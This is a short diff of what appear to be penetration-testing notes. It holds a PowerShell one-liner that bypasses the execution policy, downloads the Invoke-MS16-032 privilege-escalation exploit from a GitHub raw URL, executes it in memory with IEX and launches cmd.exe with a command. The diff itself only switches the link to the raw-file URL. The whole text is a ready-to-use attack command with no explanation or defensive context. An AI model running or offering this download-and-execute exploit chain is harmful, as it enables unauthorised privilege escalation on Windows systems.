@@ -9,7 +9,7 @@ set-executionpolicy remotesigned
 
 powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c whoami /add'"
 
-https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Invoke-MS16-032.ps1
+https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1
 
 
 
